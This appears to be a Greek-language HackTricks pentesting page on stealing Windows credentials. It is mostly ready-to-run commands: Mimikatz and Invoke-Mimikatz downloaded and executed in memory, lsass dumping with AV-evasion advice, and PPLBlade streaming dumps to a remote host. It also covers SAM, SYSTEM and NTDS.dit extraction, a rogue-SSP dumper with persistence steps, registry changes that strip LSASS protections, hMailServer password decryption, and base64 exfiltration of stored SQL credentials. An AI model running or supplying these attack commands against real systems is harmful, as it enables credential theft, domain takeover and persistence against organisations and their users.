# Κλοπή Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Βρες άλλα πράγματα που μπορεί να κάνει το Mimikatz σε** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Μάθετε για μερικές πιθανές προστασίες διαπιστευτηρίων εδώ.**](credentials-protections.md) **Αυτές οι προστασίες μπορεί να εμποδίσουν το Mimikatz από την εξαγωγή κάποιων διαπιστευτηρίων.**

## Διαπιστευτήρια με Meterpreter

Χρησιμοποιήστε το [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **που** έχω δημιουργήσει για να **αναζητήσετε passwords και hashes** μέσα στο θύμα.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Εφόσον **Procdump από** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**είναι ένα νόμιμο εργαλείο της Microsoft**, δεν ανιχνεύεται από τον Defender.\
Μπορείτε να χρησιμοποιήσετε αυτό το εργαλείο για να **dump the lsass process**, **download the dump** και να **extract** τα **credentials locally** από το dump.

Μπορείτε επίσης να χρησιμοποιήσετε [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Αυτή η διαδικασία γίνεται αυτόματα με [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Σημείωση**: Κάποια **AV** μπορεί να **εντοπίσει** ως **κακόβουλη** τη χρήση του **procdump.exe to dump lsass.exe**, αυτό συμβαίνει επειδή **εντοπίζουν** το string **"procdump.exe" and "lsass.exe"**. Συνεπώς είναι πιο **διακριτικό** να **περάσετε** ως **όρισμα** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**

### Dumping lsass with **comsvcs.dll**

A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **συνάρτηση** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Μπορείτε να αυτοματοποιήσετε αυτή τη διαδικασία με** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Δημιουργία dump του lsass με το Task Manager**

1. Κάντε δεξί κλικ στο Task Bar και κάντε κλικ στο Task Manager
2. Κάντε κλικ στο More details
3. Αναζητήστε τη διαδικασία "Local Security Authority Process" στην καρτέλα Processes
4. Κάντε δεξί κλικ στη διαδικασία "Local Security Authority Process" και επιλέξτε "Create dump file".

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα υπογεγραμμένο εκτελέσιμο αρχείο της Microsoft που αποτελεί μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass με PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) είναι ένα Protected Process Dumper Tool που υποστηρίζει obfuscating memory dump και τη μεταφορά τους σε remote workstations χωρίς να τα αποθηκεύει στον δίσκο.

**Κύριες λειτουργίες**:

1. Παράκαμψη προστασίας PPL
2. Απόκρυψη memory dump αρχείων για αποφυγή των signature-based detection μηχανισμών του Defender
3. Μεταφόρτωση memory dump με RAW και SMB upload μεθόδους χωρίς αποθήκευση στο δίσκο (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Η Ink Dragon διαθέτει ένα τριών σταδίων dumper με το όνομα **LalsDumper** που δεν καλεί ποτέ το `MiniDumpWriteDump`, οπότε τα EDR hooks σε αυτό το API δεν ενεργοποιούνται ποτέ:

1. **Stage 1 loader (`lals.exe`)** – ψάχνει στο `fdp.dll` για ένα placeholder που αποτελείται από 32 πεζά χαρακτήρες `d`, το αντικαθιστά με το απόλυτο path προς το `rtu.txt`, αποθηκεύει το patched DLL ως `nfdp.dll` και καλεί `AddSecurityPackageA("nfdp","fdp")`. Αυτό αναγκάζει το **LSASS** να φορτώσει το κακόβουλο DLL ως νέο Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – όταν το LSASS φορτώνει το `nfdp.dll`, το DLL διαβάζει το `rtu.txt`, εκτελεί XOR κάθε byte με `0x20` και κάνει map το αποκωδικοποιημένο blob στη μνήμη πριν μεταβιβάσει την εκτέλεση.
3. **Stage 3 dumper** – το mapped payload επαναυλοποιεί τη λογική του MiniDump χρησιμοποιώντας **direct syscalls** που επιλύονται από hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Ένα αφιερωμένο export με όνομα `Tom` ανοίγει `%TEMP%\<pid>.ddt`, ρέει ένα συμπιεσμένο LSASS dump στο αρχείο και κλείνει το handle ώστε να μπορεί να γίνει exfiltration αργότερα.

Operator notes:

* Διατηρήστε τα `lals.exe`, `fdp.dll`, `nfdp.dll`, και `rtu.txt` στον ίδιο φάκελο. Το Stage 1 ξαναγράφει το hard-coded placeholder με το απόλυτο path προς το `rtu.txt`, οπότε το να τα χωρίσετε σπάει την αλυσίδα.
* Η εγγραφή γίνεται προσθέτοντας το `nfdp` στο `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Μπορείτε να θέσετε αυτή την τιμή χειροκίνητα ώστε το LSASS να κάνει reload το SSP σε κάθε boot.
* Τα `%TEMP%\*.ddt` αρχεία είναι συμπιεσμένα dumps. Αποσυμπιέστε τα τοπικά, και στη συνέχεια δώστε τα στο Mimikatz/Volatility για credential extraction.
* Το τρέξιμο του `lals.exe` απαιτεί admin/SeTcb δικαιώματα ώστε το `AddSecurityPackageA` να επιτύχει· μόλις η κλήση επιστρέψει, το LSASS φορτώνει διαφανώς το rogue SSP και εκτελεί το Stage 2.
* Η αφαίρεση του DLL από το δίσκο δεν το εκδιώκει από το LSASS. Είτε διαγράψτε την καταχώρηση στο registry και κάντε restart το LSASS (reboot) είτε αφήστε το για μακροχρόνια persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Εξαγωγή του NTDS.dit από τον target DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Εξαγωγή του ιστορικού κωδικών από το NTDS.dit του στοχευμένου DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Εμφάνιση της ιδιότητας pwdLastSet για κάθε λογαριασμό του NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Κλοπή SAM & SYSTEM

Αυτά τα αρχεία πρέπει να βρίσκονται στο _C:\windows\system32\config\SAM_ και _C:\windows\system32\config\SYSTEM_. Αλλά **δεν μπορείτε απλώς να τα αντιγράψετε με τον κανονικό τρόπο** επειδή είναι προστατευμένα.

### Από το Registry

Ο ευκολότερος τρόπος για να αποκτήσετε αυτά τα αρχεία είναι να πάρετε ένα αντίγραφο από το Registry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Κατεβάστε** αυτά τα αρχεία στο μηχάνημά σας Kali και **εξάγετε τα hashes** χρησιμοποιώντας:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Μπορείτε να αντιγράψετε προστατευμένα αρχεία χρησιμοποιώντας αυτήν την υπηρεσία. Πρέπει να είστε Administrator.

#### Using vssadmin

Το δυαδικό αρχείο vssadmin είναι διαθέσιμο μόνο σε εκδόσεις Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Αλλά μπορείτε να κάνετε το ίδιο από **Powershell**. Αυτό είναι ένα παράδειγμα του **πώς να αντιγράψετε το SAM file** (ο σκληρός δίσκος που χρησιμοποιείται είναι "C:" και αποθηκεύεται στο C:\users\Public) αλλά μπορείτε να το χρησιμοποιήσετε για να αντιγράψετε οποιοδήποτε προστατευμένο αρχείο:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Κώδικας από το βιβλίο: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Τέλος, μπορείτε επίσης να χρησιμοποιήσετε το [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) για να δημιουργήσετε ένα αντίγραφο του SAM, SYSTEM και ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Το αρχείο **NTDS.dit** είναι γνωστό ως η καρδιά του **Active Directory**, περιέχοντας κρίσιμα δεδομένα για user objects, groups και τις memberships τους. Εκεί αποθηκεύονται τα **password hashes** για τους domain users. Το αρχείο αυτό είναι βάση δεδομένων **Extensible Storage Engine (ESE)** και βρίσκεται στο **_%SystemRoom%/NTDS/ntds.dit_**.

Μέσα σε αυτή τη βάση δεδομένων διατηρούνται τρία κύρια tables:

- **Data Table**: Αυτός ο πίνακας είναι υπεύθυνος για την αποθήκευση λεπτομερειών σχετικά με objects όπως users και groups.
- **Link Table**: Καταγράφει τις σχέσεις, όπως τις group memberships.
- **SD Table**: Εδώ φυλάσσονται οι **Security descriptors** για κάθε object, εξασφαλίζοντας την ασφάλεια και τον έλεγχο πρόσβασης για τα αποθηκευμένα αντικείμενα.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Τα Windows χρησιμοποιούν _Ntdsa.dll_ για να αλληλεπιδράσουν με αυτό το αρχείο και αυτό χρησιμοποιείται από το _lsass.exe_. Επομένως, **μέρος** του αρχείου **NTDS.dit** μπορεί να βρίσκεται **στη μνήμη του `lsass`** (μπορεί να βρείτε τα πιο πρόσφατα προσπελασμένα δεδομένα πιθανώς λόγω βελτίωσης επιδόσεων μέσω χρήσης **cache**).

#### Αποκρυπτογράφηση των hashes μέσα στο NTDS.dit

Το hash είναι κρυπτογραφημένο 3 φορές:

1. Αποκρυπτογράφηση του Password Encryption Key (**PEK**) χρησιμοποιώντας το **BOOTKEY** και **RC4**.
2. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας **PEK** και **RC4**.
3. Αποκρυπτογράφηση του **hash** χρησιμοποιώντας **DES**.

Το **PEK** έχει την **ίδια τιμή** σε **κάθε domain controller**, αλλά είναι **κρυπτογραφημένο** μέσα στο αρχείο **NTDS.dit** χρησιμοποιώντας το **BOOTKEY** του αρχείου **SYSTEM** του **domain controller** (διαφέρει μεταξύ των domain controllers). Γι' αυτό, για να αποκτήσετε τα **credentials** από το αρχείο **NTDS.dit** χρειάζεστε τα αρχεία **NTDS.dit** και **SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Διαθέσιμο από Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Μπορείτε επίσης να χρησιμοποιήσετε την τεχνική [**volume shadow copy**](#stealing-sam-and-system) για να αντιγράψετε το αρχείο **ntds.dit**. Θυμηθείτε ότι θα χρειαστείτε επίσης ένα αντίγραφο του αρχείου **SYSTEM** (πάλι, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) τεχνική).

### **Εξαγωγή hashes από NTDS.dit**

Μόλις **αποκτήσετε** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξαγάγετε τα hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Μπορείτε επίσης να **εξάγετε αυτά αυτόματα** χρησιμοποιώντας έναν έγκυρο χρήστη domain admin:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Για **μεγάλα αρχεία NTDS.dit** συνιστάται να τα εξάγετε χρησιμοποιώντας [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Επιπλέον, μπορείτε επίσης να χρησιμοποιήσετε το **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ ή το **mimikatz** `lsadump::lsa /inject`

### **Εξαγωγή αντικειμένων του domain από το NTDS.dit σε μια βάση SQLite**

Τα αντικείμενα NTDS μπορούν να εξαχθούν σε μια βάση SQLite με το [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Εξάγονται όχι μόνο τα μυστικά αλλά και ολόκληρα τα αντικείμενα και οι ιδιότητές τους για περαιτέρω εξαγωγή πληροφοριών όταν το ακατέργαστο αρχείο NTDS.dit έχει ήδη ανακτηθεί.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Το `SYSTEM` hive είναι προαιρετικό αλλά επιτρέπει την αποκρυπτογράφηση μυστικών (NT & LM hashes, supplemental credentials όπως cleartext passwords, kerberos ή trust keys, NT & LM password histories). Μαζί με άλλες πληροφορίες εξάγονται τα εξής δεδομένα: user και machine accounts με τα hashes τους, UAC flags, timestamp του τελευταίου logon και της αλλαγής password, περιγραφές λογαριασμών, ονόματα, UPN, SPN, groups και recursive memberships, το δέντρο των organizational units και η συμμετοχή σε αυτά, trusted domains με trusts type, direction και attributes...

## Lazagne

Κατεβάστε το binary από [here](https://github.com/AlessandroZ/LaZagne/releases). Μπορείτε να χρησιμοποιήσετε αυτό το binary για να εξάγετε credentials από διάφορα software.
```
lazagne.exe all
```
## Άλλα εργαλεία για εξαγωγή credentials από SAM και LSASS

### Windows credentials Editor (WCE)

Αυτό το εργαλείο μπορεί να χρησιμοποιηθεί για την εξαγωγή credentials από τη μνήμη. Κατεβάστε το από: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Εξαγωγή credentials από το αρχείο SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Εξαγωγή credentials από το SAM file
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) και απλώς **εκτελέστε το** και οι κωδικοί θα εξαχθούν.

## Εξόρυξη αδρανών συνεδριών RDP και αποδυνάμωση των ελέγχων ασφάλειας

Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – αναλύστε κάθε user hive στο `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Κάθε υποκλειδί αποθηκεύει το όνομα του server, `UsernameHint`, και τη χρονοσφραγίδα της τελευταίας εγγραφής. Μπορείτε να αναπαράγετε τη λογική του FinalDraft με PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – κάντε query στο `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log για τα Event IDs **21** (successful logon) και **25** (disconnect) για να χαρτογραφήσετε ποιος διαχειρίστηκε το μηχάνημα:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Μόλις ξέρετε ποιος Domain Admin συνδέεται τακτικά, κάντε dump το LSASS (με LalsDumper/Mimikatz) ενώ η **αποσυνδεδεμένη** συνεδρία τους εξακολουθεί να υπάρχει. Το CredSSP + NTLM fallback αφήνει τον verifier και τα tokens τους μέσα στο LSASS, τα οποία μπορούν στη συνέχεια να αναπαραχθούν πάνω από SMB/WinRM για να αρπάξετε το `NTDS.dit` ή να εδραιώσετε persistence σε domain controllers.

### Registry downgrades που στοχεύει το FinalDraft
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Η ρύθμιση `DisableRestrictedAdmin=1` εξαναγκάζει την πλήρη επαναχρησιμοποίηση credentials/tickets κατά το RDP, επιτρέποντας pivots τύπου pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` απενεργοποιεί το UAC token filtering, έτσι ώστε οι local admins να λαμβάνουν unrestricted tokens μέσω του δικτύου.
* `DSRMAdminLogonBehavior=2` επιτρέπει στον DSRM administrator να συνδεθεί ενώ ο DC είναι online, δίνοντας στους attackers έναν ακόμη ενσωματωμένο λογαριασμό με υψηλά προνόμια.
* `RunAsPPL=0` αφαιρεί τις LSASS PPL protections, καθιστώντας την πρόσβαση στη μνήμη απλή για dumpers όπως LalsDumper.

## hMailServer διαπιστευτήρια βάσης δεδομένων (post-compromise)

hMailServer αποθηκεύει το DB password στο `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` κάτω από `[Database] Password=`. Η τιμή είναι Blowfish-encrypted με το στατικό κλειδί `THIS_KEY_IS_NOT_SECRET` και 4-byte word endianness swaps. Χρησιμοποίησε το hex string από το INI με αυτό το Python snippet:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Με τον κωδικό σε απλό κείμενο, αντιγράψτε τη βάση δεδομένων SQL CE για να αποφύγετε το κλείδωμα αρχείων, φορτώστε τον 32-bit provider και αναβαθμίστε αν χρειάζεται πριν ερωτήσετε τα hashes:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Η στήλη `accountpassword` χρησιμοποιεί το hMailServer hash format (hashcat mode `1421`). Το cracking αυτών των τιμών μπορεί να παρέχει επαναχρησιμοποιήσιμα credentials για WinRM/SSH pivots.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Κάποια tooling συλλαμβάνουν **plaintext logon passwords** παρεμβαίνοντας στο LSA logon callback `LsaApLogonUserEx2`. Η ιδέα είναι να γίνει hook ή wrap του authentication package callback ώστε τα credentials να καταγράφονται **during logon** (πριν το hashing), και στη συνέχεια να γραφτούν στο δίσκο ή να επιστραφούν στον operator. Συνήθως υλοποιείται ως helper που injects σε ή εγγράφεται στο LSA, και στη συνέχεια καταγράφει κάθε επιτυχημένο interactive/network logon event με το username, domain και password.

Σημειώσεις λειτουργίας:
- Απαιτεί local admin/SYSTEM για να φορτώσει το helper στην authentication path.
- Τα captured credentials εμφανίζονται μόνο όταν πραγματοποιείται logon (interactive, RDP, service, ή network logon ανάλογα με το hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

Το SQL Server Management Studio (SSMS) αποθηκεύει τις αποθηκευμένες πληροφορίες σύνδεσης σε ένα αρχείο `sqlstudio.bin` ανά χρήστη. Αφιερωμένα dumpers μπορούν να parse-άρουν το αρχείο και να ανακτήσουν τα αποθηκευμένα SQL credentials. Σε shells που επιστρέφουν μόνο το output εντολών, το αρχείο συχνά exfiltrated με κωδικοποίηση ως Base64 και εκτύπωση στο stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Από την πλευρά του operator, αναδημιουργήστε το αρχείο και τρέξτε τον dumper τοπικά για να ανακτήσετε τα credentials:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Αναφορές

- [Unit 42 – Μια έρευνα για χρόνια απαρατήρητων επιχειρήσεων που στοχεύουν τομείς υψηλής αξίας](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Αποκαλύπτοντας το Relay Network και την εσωτερική λειτουργία μιας κρυφής επιθετικής επιχείρησης](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
